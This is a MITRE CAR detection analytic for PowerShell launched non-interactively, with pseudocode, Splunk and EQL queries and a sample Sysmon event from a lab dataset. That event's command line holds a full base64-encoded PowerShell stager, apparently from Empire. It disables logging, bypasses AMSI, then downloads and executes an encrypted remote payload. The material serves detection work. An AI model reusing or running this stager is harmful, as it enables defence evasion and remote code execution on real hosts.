title: Powershell Execution
submission_date: 2014/04/11
information_domain: Host
subtypes:
  - Process
analytic_types:
  - TTP
contributors:
  - MITRE
id: CAR-2014-04-003
description: |-
  [PowerShell](https://attack.mitre.org/techniques/T1086/) is a scripting environment included with Windows that is used by both attackers and administrators. Execution of PowerShell scripts in most Windows versions is opaque and not typically secured by antivirus which makes using PowerShell an easy way to circumvent security measures. This analytic detects execution of PowerShell scripts.

  Powershell can be used to hide monitored command line execution such as:
  -   `net use`
  -   `sc start`
coverage:
  - technique: T1086
    tactics:
      - TA0002
    coverage: High
  - technique: T1064
    tactics:
      - TA0005
    coverage: Moderate
implementations:
  - description: 'Look for versions of `PowerShell` that were not launched interactively.'
    code: |-
      process = search Process:Create
      powershell = filter process where (exe == "powershell.exe" AND parent_exe != "explorer.exe" )
      output powershell
    type: pseudocode
  - description: Splunk version of the above pseudocode.
    code: |-
      index=__your_sysmon_index__ EventCode=1 Image="C:\\Windows\\*\\powershell.exe" ParentImage!="C:\\Windows\\explorer.exe"|stats values(CommandLine) as "Command Lines" values(ParentImage) as "Parent Images" by ComputerName
    type: Splunk
    data_model: Sysmon native
  - description: EQL version of the above pseudocode.
    code: |-
      process where subtype.create and
        (process_name == "powershell.exe" and parent_process_name != "explorer.exe")    
    type: EQL
    data_model: EQL native
data_model_references:
  - process/create/exe
  - process/create/parent_exe
true_positives:
  - source: 'Mordor (Sysmon)'
    description: 'Sysmon event from the Mordor [Empire Userland Registry dataset](https://github.com/hunters-forge/mordor/blob/master/small_datasets/windows/persistence/registry_run_keys_startup_folder_T1060/empire_userland_registry.md).'
    event: '{"_index": "logs-endpoint-winevent-sysmon-2019.03.19",
              "_type": "_doc",
              "_id": "2f5e5acf093ed3e6a607377752699bf68b38fbb2",
              "_score": 1,
              "_source": {
                "user_logon_id": 62343944,
                "beat_name": "WECserver",
                "file_description": "Windows PowerShell",
                "beat_version": "6.5.4",
                "user_reporter_type": "User",
                "thread_id": 2716,
                "record_number": "2958609",
                "log_name": "Microsoft-Windows-Sysmon/Operational",
                "process_integrity_level": "High",
                "log_ingest_timestamp": "2019-03-19T19:31:56.948Z",
                "file_company": "Microsoft Corporation",
                "fingerprint_process_command_line_mm3": 2833745090,
                "user_reporter_name": "SYSTEM",
                "hash_sha256": "BA4038FD20E474C047BE8AAD5BFACDB1BFC1DDBE12F803F473B7918D8D819436",
                "user_domain": "shire",
                "task": "Process Create (rule: ProcessCreate)",
                "meta_process_command_line_length": 5411,
                "process_id": "904",
                "meta_user_name_is_machine": "false",
                "provider_guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9",
                "event_id": 1,
                "process_current_directory": "c:\\windows\\system32\\",
                "process_command_line": "c:\\windows\\system32\\windowspowershell\\v1.0\\powershell -nop -sta -w 1 -enc  sqbgacgajabqafmavgbfafiacwbjag8atgbuaeeaygbsaeualgbqafmavgbfahiacwbpae8atgauae0ayqbkag8augagac0azwbfacaamwapahsajaa5agyamwa9afsaugblagyaxqauaeeauwbzaguabqbcaewawqauaecazqbuafqawqbwaguakaanafmaeqbzahqazqbtac4atqbhag4ayqbnaguabqblag4adaauaeeadqb0ag8abqbhahqaaqbvag4algbvahqaaqbsahmajwapac4aigbhaguadabgaekazqbgaewazaaiacgajwbjageaywboaguazabhahiabwb1ahaauabvagwaaqbjahkauwblahqadabpag4azwbzaccalaanae4ajwaraccabwbuafaadqbiagwaaqbjacwauwb0ageadabpagmajwapadsasqbmacgajaa5aeyamwapahsajaawaduarga9acqaoqbgadmalgbhaeuavabwageatabvaguakaakae4adqbmaewakqa7aekazgaoacqamaa1aeyawwanafmaywbyagkacab0aeiajwaraccababvagmaawbmag8azwbnagkabgbnaccaxqapahsajaawaduargbbaccauwbjahiaaqbwahqaqganacsajwbsag8aywbraewabwbnagcaaqbuagcajwbdafsajwbfag4ayqbiagwazqbtagmacgbpahaadabcaccakwanagwabwbjagsatabvagcazwbpag4azwanaf0apqawadsajaawaduazgbbaccauwbjahiaaqbwahqaqganacsajwbsag8aywbraewabwbnagcaaqbuagcajwbdafsajwbfag4ayqbiagwazqbtagmacgbpahaadabcagwabwbjagsasqbuahyabwbjageadabpag8abgbmag8azwbnagkabgbnaccaxqa9adaafqakafyaqqbmad0awwbdae8atabsaguaywbuagkatwbuafmalgbhaguatgbfafiasqbdac4arabpaemadabjae8atgbhafiawqbbafmavabsagkatgbnacwauwb5afmadabfae0algbpagiasgbfaemavabdaf0aoga6ag4arqb3acgakqa7acqadgbhaewalgbbaeqazaaoaccarqbuageaygbsaguauwbjahiaaqbwahqaqganacsajwbsag8aywbraewabwbnagcaaqbuagcajwasadaakqa7acqavgbbaewalgbbagqaraaoaccarqbuageaygbsaguauwbjahiaaqbwahqaqgbsag8aywbraekabgb2ag8aywbhahqaaqbvag4atabvagcazwbpag4azwanacwamaapadsajaawaduazgbbaccasablaeuawqbfaewatwbdaeeatabfae0aqqbdaegasqboaeuaxabtag8azgb0ahcayqbyaguaxabqag8ababpagmaaqblahmaxabnagkaywbyag8acwbvagyadabcafcaaqbuagqabwb3ahmaxabqag8adwblahiauwboaguababsafwauwbjahiaaqbwahqaqganacsajwbsag8aywbraewabwbnagcaaqbuagcajwbdad0ajabwaeeatab9aeuababtaeuaewbbafmaqwbyaekauab0aeiababpagmaswbdac4aigbhaguavabgaekarqbgaewazaaiacgajwbzagkazwbuageadab1ahiazqbzaccalaanae4ajwaraccabwbuafaadqbiagwaaqbjacwauwb0ageadabpagmajwapac4auwbfahqavgbbagwadqblacgajaboafuababmacwakaboaguavwatae8aqgbqaeuaywb0acaaqwbpaewabablagmadabpag8atgbzac4arwblae4arqbsaekaqwauaegayqbtaggauwbfahqawwbtahqaugbpae4arwbdackakqb9acqaugbfagyapqbbafiarqbmaf0algbbahmauwblae0aygbmafkalgbhaeuavabuafkacablacgajwbtahkacwb0aguabqauae0ayqbuageazwblag0azqbuahqalgbbahuadabvag0ayqb0agkabwbuac4aqqbtahmaaqbvahqaaqbsahmajwapadsajabsaeuazgauaecarqbuaeyaaqblagwaraaoaccayqbtahmaaqbjag4aaqb0aeyayqbpagwazqbkaccalaanae4abwbuafaadqbiagwaaqbjacwauwb0ageadabpagmajwapac4auwblahqavgbbagwadqblacgajabuafuatabmacwajab0ahiavqbfackaowb9adsawwbtahkacwb0aeuatqauae4azqbuac4auwbfafiavgbpagmazqbqae8asqboafqatqbbae4aqqbnaeuacgbdadoaogbfahgauablagmadaaxadaamabdae8atgbuaekabgbvaguapqawadsajaaxadcanwa9ae4arqbxac0atwbcaeoarqbjafqaiabtahkauwbuaguabqauae4azqb0ac4avwblagiaqwbmaekarqbuafqaowakahuapqanae0abwb6agkababsagealwa1ac4amaagacgavwbpag4azabvahcacwagae4avaagadyalgaxadsaiabxae8avwa2adqaowagafqacgbpagqazqbuahqalwa3ac4amaa7acaacgb2adoamqaxac4amaapacaababpagsazqagaecazqbjagsabwanadsawwbtahkacwb0aguabqauae4azqb0ac4auwblahiadgbpagmazqbqag8aaqbuahqatqbhag4ayqbnaguacgbdadoaogbtaguacgb2aguacgbdaguacgb0agkazgbpagmayqb0aguavgbhagwaaqbkageadabpag8abgbdageababsagiayqbjagsaiaa9acaaewakahqacgb1aguafqa7acqamqa3adcalgbiaguaqqbkaeuacgbzac4aqqbeaeqakaanafuacwblahialqbbagcazqbuahqajwasacqadqapadsajaaxadcanwauaegarqbbaeqazqbsahmalgbbaeqazaaoaccavqbzaguacgataeeazwblag4adaanacwajab1ackaowakadeanwa3ac4auabyag8awabzad0awwbtafkacwb0aguabqauae4arqb0ac4avwbfagiaugbfafeavqblafmavabdadoaogbeaeuazgbhafuababuafcarqbcafaaugbpahgaeqa7acqamqa3adcalgbqahiabwb4ahkalgbdafiarqbeaeuabgbuaekayqbmahmaiaa9acaawwbtafkauwb0aguabqauae4arqbuac4aqwbyaeuazabfag4avabpageatabdaeeaqwboaeuaxqa6adoarablaeyayqb1aewadaboaeuadab3ae8acgblaemacgbfagqazqboafqasqbhaewacwa7acqauwbjahiaaqbwahqaogbqahiabwb4ahkaiaa9acaajaaxadcanwauafaacgbvahgaeqa7acqaswa9afsauwb5afmadabfae0algbuaguawabuac4arqboaemabwbkaekabgbnaf0aoga6aeeauwbdaekasqauaecazqbuaeiawqb0aguauwaoaccafgbracoaxwbgafmaagbyadgajqb4ahcazqbkadyaaab8afaaswauagyaewbvae4atqbiahuazabwaduaeqbtaccakqa7acqauga9ahsajabeacwajablad0ajabbahiazwbtadsajabtad0amaauac4amga1aduaowawac4algayaduanqb8acuaewakaeoapqaoacqasgaracqauwbbacqaxwbdacsajablafsajabfacuajablac4aqwbvafuabgb0af0akqaladianqa2adsajabtafsajabfaf0alaakafmawwakaeoaxqa9acqauwbbacqasgbdacwajabtafsajabfaf0afqa7acqarab8acuaewakaekapqaoacqasqaradeakqaladianqa2adsajabiad0akaakaegakwakafmawwakaekaxqapacuamga1adyaowakafmawwakaekaxqasacqauwbbacqasabdad0ajabtafsajabiaf0alaakafmawwakaekaxqa7acqaxwatagiawabvahiajabtafsakaakafmawwakaekaxqaracqauwbbacqasabdackajqayaduangbdah0afqa7acqacwblahiapqakacgawwbuaguawabuac4arqbuagmatwbkaekabgbhaf0aoga6afuabgbjaemabwbkagualgbhaeuavabtahqacgbpag4arwaoafsaqwbpag4adgbfafiavabdadoaogbgahiatwbtaeiayqbzaeuanga0afmadabsagkabgbhacgajwbhaeeaqgawaeeasabraeeaywbbaeiaegbbaeqabwbbaewadwbbahyaqqbeaeuaqqbnaeeaqqb1aeearabbaeeatabnaeeaeabbaeqaqqbbaewazwbbahgaqqbeaeeaqqboagcaqqa9accakqapackaowakahqapqanac8ababvagcaaqbuac8acabyag8aywblahmacwauahaaaabwaccaowakadeanwa3ac4asablaeearablafiacwauaeearabkacgaigbdag8abwbragkazqaiacwaigbiafkadgbsafaasgbnag0acwbrahkatgbgafqaawa9ageacqbhagianqa3ahaaaabkaeuavgbaafoavqbmafcatab0afqavqbkagkauga4ahaawqbzad0aigapadsajabeaeeavabbad0ajaaxadcanwauaeqatwbxae4ababpaeearabeaeeavabhacgajabzaeuacgaracqavaapadsajabpahyapqakagqaqqbuaeeawwawac4algazaf0aowakagqayqbuaeeapqakaeqaqqbuageawwa0ac4algakagqayqb0aeealgbsaeuabgbnahqaaabdadsalqbqag8asqbuafsaqwboaeeacgbbaf0axqaoacyaiaakafiaiaakaeqayqbuaeeaiaaoacqasqbwacsajablackakqb8aekarqbyaa==",
                "meta_user_reporter_name_is_machine": "false",
                "file_product": "Microsoft速 Windows速 Operating System",
                "process_name": "powershell.exe",
                "beat_hostname": "WECserver",
                "process_path": "c:\\windows\\system32\\windowspowershell\\v1.0\\powershell.exe",
                "process_parent_name": "wmiprvse.exe",
                "z_original_message": "Process Create:\nRuleName: \nUtcTime: 2019-03-19 19:31:56.940\nProcessGuid: {905CC552-43AC-5C91-0000-0010B44BB703}\nProcessId: 904\nImage: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\nFileVersion: 10.0.14393.0 (rs1_release.160715-1616)\nDescription: Windows PowerShell\nProduct: Microsoft速 Windows速 Operating System\nCompany: Microsoft Corporation\nCommandLine: C:\\Windows\\System32\\WindowsPowershell\\v1.0\\powershell -noP -sta -w 1 -enc  SQBGACgAJABQAFMAVgBFAFIAcwBJAG8ATgBUAEEAYgBsAEUALgBQAFMAVgBFAHIAcwBpAE8ATgAuAE0AYQBKAG8AUgAgAC0AZwBFACAAMwApAHsAJAA5AGYAMwA9AFsAUgBlAGYAXQAuAEEAUwBzAGUAbQBCAEwAWQAuAEcAZQBUAFQAWQBwAGUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBVAHQAaQBsAHMAJwApAC4AIgBHAGUAdABGAEkAZQBgAEwAZAAiACgAJwBjAGEAYwBoAGUAZABHAHIAbwB1AHAAUABvAGwAaQBjAHkAUwBlAHQAdABpAG4AZwBzACcALAAnAE4AJwArACcAbwBuAFAAdQBiAGwAaQBjACwAUwB0AGEAdABpAGMAJwApADsASQBmACgAJAA5AEYAMwApAHsAJAAwADUARgA9ACQAOQBGADMALgBHAEUAVABWAGEATABVAGUAKAAkAE4AdQBMAEwAKQA7AEkAZgAoACQAMAA1AEYAWwAnAFMAYwByAGkAcAB0AEIAJwArACcAbABvAGMAawBMAG8AZwBnAGkAbgBnACcAXQApAHsAJAAwADUARgBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0APQAwADsAJAAwADUAZgBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCAGwAbwBjAGsASQBuAHYAbwBjAGEAdABpAG8AbgBMAG8AZwBnAGkAbgBnACcAXQA9ADAAfQAkAFYAQQBMAD0AWwBDAE8ATABsAGUAYwBUAGkATwBuAFMALgBHAGUATgBFAFIASQBDAC4ARABpAEMAdABJAE8ATgBhAFIAWQBbAFMAVABSAGkATgBnACwAUwB5AFMAdABFAE0ALgBPAGIASgBFAEMAVABdAF0AOgA6AG4ARQB3ACgAKQA7ACQAdgBhAEwALgBBAEQAZAAoACcARQBuAGEAYgBsAGUAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwAsADAAKQA7ACQAVgBBAEwALgBBAGQARAAoACcARQBuAGEAYgBsAGUAUwBjAHIAaQBwAHQAQgBsAG8AYwBrAEkAbgB2AG8AYwBhAHQAaQBvAG4ATABvAGcAZwBpAG4AZwAnACwAMAApADsAJAAwADUAZgBbACcASABLAEUAWQBfAEwATwBDAEEATABfAE0AQQBDAEgASQBOAEUAXABTAG8AZgB0AHcAYQByAGUAXABQAG8AbABpAGMAaQBlAHMAXABNAGkAYwByAG8AcwBvAGYAdABcAFcAaQBuAGQAbwB3AHMAXABQAG8AdwBlAHIAUwBoAGUAbABsAFwAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAD0AJABWAEEATAB9AEUAbABTAEUAewBbAFMAQwByAEkAUAB0AEIAbABPAGMASwBdAC4AIgBHAGUAVABGAEkARQBgAEwAZAAiACgAJwBzAGkAZwBuAGEAdAB1AHIAZQBzACcALAAnAE4AJwArACcAbwBuAFAAdQBiAGwAaQBjACwAUwB0AGEAdABpAGMAJwApAC4AUwBFAHQAVgBBAGwAdQBlACgAJABOAFUAbABMACwAKABOAGUAVwAtAE8AQgBqAEUAYwB0ACAAQwBPAEwAbABlAGMAdABpAG8ATgBzAC4ARwBlAE4ARQBSAEkAQwAuAEgAYQBTAGgAUwBFAHQAWwBTAHQAUgBpAE4ARwBdACkAKQB9ACQAUgBFAGYAPQBbAFIARQBmAF0ALgBBAHMAUwBlAE0AYgBMAFkALgBHAEUAVABUAFkAcABlACgAJwBTAHkAcwB0AGUAbQAuAE0AYQBuAGEAZwBlAG0AZQBuAHQALgBBAHUAdABvAG0AYQB0AGkAbwBuAC4AQQBtAHMAaQBVAHQAaQBsAHMAJwApADsAJABSAEUAZgAuAEcARQBUAEYAaQBlAGwARAAoACcAYQBtAHMAaQBJAG4AaQB0AEYAYQBpAGwAZQBkACcALAAnAE4AbwBuAFAAdQBiAGwAaQBjACwAUwB0AGEAdABpAGMAJwApAC4AUwBlAHQAVgBBAGwAdQBlACgAJABuAFUATABMACwAJAB0AHIAVQBFACkAOwB9ADsAWwBTAHkAcwB0AEUATQAuAE4AZQBUAC4AUwBFAFIAVgBpAGMAZQBQAE8ASQBOAFQATQBBAE4AQQBnAEUAcgBdADoAOgBFAHgAUABlAGMAdAAxADAAMABDAE8ATgBUAEkAbgBVAGUAPQAwADsAJAAxADcANwA9AE4ARQBXAC0ATwBCAEoARQBjAFQAIABTAHkAUwBUAGUAbQAuAE4AZQB0AC4AVwBlAGIAQwBMAEkARQBuAFQAOwAkAHUAPQAnAE0AbwB6AGkAbABsAGEALwA1AC4AMAAgACgAVwBpAG4AZABvAHcAcwAgAE4AVAAgADYALgAxADsAIABXAE8AVwA2ADQAOwAgAFQAcgBpAGQAZQBuAHQALwA3AC4AMAA7ACAAcgB2ADoAMQAxAC4AMAApACAAbABpAGsAZQAgAEcAZQBjAGsAbwAnADsAWwBTAHkAcwB0AGUAbQAuAE4AZQB0AC4AUwBlAHIAdgBpAGMAZQBQAG8AaQBuAHQATQBhAG4AYQBnAGUAcgBdADoAOgBTAGUAcgB2AGUAcgBDAGUAcgB0AGkAZgBpAGMAYQB0AGUAVgBhAGwAaQBkAGEAdABpAG8AbgBDAGEAbABsAGIAYQBjAGsAIAA9ACAAewAkAHQAcgB1AGUAfQA7ACQAMQA3ADcALgBIAGUAQQBkAEUAcgBzAC4AQQBEAEQAKAAnAFUAcwBlAHIALQBBAGcAZQBuAHQAJwAsACQAdQApADsAJAAxADcANwAuAEgARQBBAEQAZQBSAHMALgBBAEQAZAAoACcAVQBzAGUAcgAtAEEAZwBlAG4AdAAnACwAJAB1ACkAOwAkADEANwA3AC4AUAByAG8AWABZAD0AWwBTAFkAcwB0AGUAbQAuAE4ARQB0AC4AVwBFAGIAUgBFAFEAVQBlAFMAVABdADoAOgBEAEUAZgBhAFUAbABUAFcARQBCAFAAUgBPAHgAeQA7ACQAMQA3ADcALgBQAHIAbwB4AHkALgBDAFIARQBEAEUAbgBUAEkAYQBMAHMAIAA9ACAAWwBTAFkAUwB0AGUAbQAuAE4ARQBUAC4AQwByAEUAZABFAG4AVABpAGEATABDAEEAQwBoAEUAXQA6ADoARABlAEYAYQB1AEwAdABOAEUAdAB3AE8AcgBLAEMAcgBFAGQAZQBOAFQASQBhAEwAcwA7ACQAUwBjAHIAaQBwAHQAOgBQAHIAbwB4AHkAIAA9ACAAJAAxADcANwAuAFAAcgBvAHgAeQA7ACQASwA9AFsAUwB5AFMAdABFAE0ALgBUAGUAWABUAC4ARQBOAEMAbwBkAEkAbgBnAF0AOgA6AEEAUwBDAEkASQAuAEcAZQBUAEIAWQB0AGUAUwAoACcAfgBrACoAXwBGAFMAagByADgAJQB4AHcAZQBKADYAaAB8AFAASwAuAGYAewBVAE4ATQBIAHUAZABwADUAeQBtACcAKQA7ACQAUgA9AHsAJABEACwAJABLAD0AJABBAHIAZwBTADsAJABTAD0AMAAuAC4AMgA1ADUAOwAwAC4ALgAyADUANQB8ACUAewAkAEoAPQAoACQASgArACQAUwBbACQAXwBdACsAJABLAFsAJABfACUAJABLAC4AQwBvAFUAbgB0AF0AKQAlADIANQA2ADsAJABTAFsAJABfAF0ALAAkAFMAWwAkAEoAXQA9ACQAUwBbACQASgBdACwAJABTAFsAJABfAF0AfQA7ACQARAB8ACUAewAkAEkAPQAoACQASQArADEAKQAlADIANQA2ADsAJABIAD0AKAAkAEgAKwAkAFMAWwAkAEkAXQApACUAMgA1ADYAOwAkAFMAWwAkAEkAXQAsACQAUwBbACQASABdAD0AJABTAFsAJABIAF0ALAAkAFMAWwAkAEkAXQA7ACQAXwAtAGIAWABvAHIAJABTAFsAKAAkAFMAWwAkAEkAXQArACQAUwBbACQASABdACkAJQAyADUANgBdAH0AfQA7ACQAcwBlAHIAPQAkACgAWwBUAGUAWABUAC4ARQBuAGMATwBkAEkAbgBHAF0AOgA6AFUAbgBJAEMAbwBkAGUALgBHAEUAVABTAHQAcgBpAG4ARwAoAFsAQwBPAG4AdgBFAFIAVABdADoAOgBGAHIATwBtAEIAYQBzAEUANgA0AFMAdABSAGkAbgBHACgAJwBhAEEAQgAwAEEASABRAEEAYwBBAEIAegBBAEQAbwBBAEwAdwBBAHYAQQBEAEUAQQBNAEEAQQB1AEEARABBAEEATABnAEEAeABBAEQAQQBBAEwAZwBBAHgAQQBEAEEAQQBOAGcAQQA9ACcAKQApACkAOwAkAHQAPQAnAC8AbABvAGcAaQBuAC8AcAByAG8AYwBlAHMAcwAuAHAAaABwACcAOwAkADEANwA3AC4ASABlAEEARABlAFIAcwAuAEEARABkACgAIgBDAG8AbwBrAGkAZQAiACwAIgBIAFkAdgBsAFAASgBNAG0AcwBrAHkATgBGAFQAawA9AGEAcQBHAGIANQA3AHAAaABKAEUAVgBaAFoAVQBmAFcATAB0AFQAVQBkAGkAUgA4AHAAWQBZAD0AIgApADsAJABEAEEAVABBAD0AJAAxADcANwAuAEQATwBXAE4AbABPAEEARABEAEEAVABhACgAJABzAEUAcgArACQAVAApADsAJABpAHYAPQAkAGQAQQBUAEEAWwAwAC4ALgAzAF0AOwAkAGQAYQBUAEEAPQAkAEQAQQBUAGEAWwA0AC4ALgAkAGQAYQB0AEEALgBsAEUAbgBnAHQAaABdADsALQBqAG8ASQBuAFsAQwBoAEEAcgBbAF0AXQAoACYAIAAkAFIAIAAkAEQAYQBUAEEAIAAoACQASQBWACsAJABLACkAKQB8AEkARQBYAA==\nCurrentDirectory: C:\\Windows\\system32\\\nUser: SHIRE\\Mmidge\nLogonGuid: {905CC552-43AC-5C91-0000-0020084BB703}\nLogonId: 0x3B74B08\nTerminalSessionId: 0\nIntegrityLevel: High\nHashes: SHA1=044A0CF1F6BC478A7172BF207EEF1E201A18BA02,MD5=097CE5761C89434367598B34FE32893B,SHA256=BA4038FD20E474C047BE8AAD5BFACDB1BFC1DDBE12F803F473B7918D8D819436,IMPHASH=CAEE994F79D85E47C06E5FA9CDEAE453\nParentProcessGuid: {905CC552-A560-5C85-0000-00108C030300}\nParentProcessId: 2864\nParentImage: C:\\Windows\\System32\\wbem\\WmiPrvSE.exe\nParentCommandLine: C:\\Windows\\system32\\wbem\\wmiprvse.exe -secured -Embedding",
                "user": {},
                "process_parent_id": "2864",
                "host_name": "hfdc01.shire.com",
                "user_logon_guid": "905CC552-43AC-5C91-0000-0020084BB703",
                "process_guid": "905CC552-43AC-5C91-0000-0010B44BB703",
                "user_reporter_domain": "NT AUTHORITY",
                "process_parent_command_line": "c:\\windows\\system32\\wbem\\wmiprvse.exe -secured -embedding",
                "user_session_id": "0",
                "@event_date_creation": "2019-03-19T19:31:56.940Z",
                "process_parent_path": "c:\\windows\\system32\\wbem\\wmiprvse.exe",
                "@version": "1",
                "type": "wineventlog",
                "level": "Information",
                "z_logstash_type": "wineventlog",
                "file_version": "10.0.14393.0 (rs1_release.160715-1616)",
                "version": 5,
                "@timestamp": "2019-03-19T19:31:56.948Z",
                "user_name": "mmidge",
                "z_logstash_pipeline": [
                  "0098",
                  "fingerprint-0099-001",
                  "fingerprint-0099-003",
                  "winlogbeat_6-field_nest_cleanup",
                  "1500",
                  "1521",
                  "1522",
                  "1523_1",
                  "1523_6",
                  "1524_2",
                  "1524_5",
                  "1524_6",
                  "1524_7",
                  "1531",
                  "1541_1",
                  "1541_2",
                  "1543_1",
                  "1544_1",
                  "1544_2",
                  "1544_3",
                  "1544_4",
                  "1544_7",
                  "winevent-hostname-cleanup",
                  "winevent-user_name-is-machine-account",
                  "winevent-user_reporter_name-is-machine-account",
                  "ruby-8801-0001",
                  "copy-8802-001",
                  "copy-8802-002",
                  "fingerprint-8901-001"
                ],
                "opcode": "Info",
                "host": {
                  "name": "WECserver"
                },
                "source_name": "Microsoft-Windows-Sysmon",
                "hash_sha1": "044A0CF1F6BC478A7172BF207EEF1E201A18BA02",
                "action": "processcreate",
                "process_parent_guid": "905CC552-A560-5C85-0000-00108C030300",
                "user_reporter_sid": "S-1-5-18",
                "hash_md5": "097CE5761C89434367598B34FE32893B",
                "meta_process_command_line_has_non_ascii": false,
                "hash_imphash": "CAEE994F79D85E47C06E5FA9CDEAE453",
                "user_account": "shire\\mmidge"
              },
              "fields": {
                "@timestamp": [
                  "2019-03-19T19:31:56.948Z"
                ],
                "@event_date_creation": [
                  "2019-03-19T19:31:56.940Z"
                ],
                "log_ingest_timestamp": [
                  "2019-03-19T19:31:56.948Z"
                ]
              }
            }'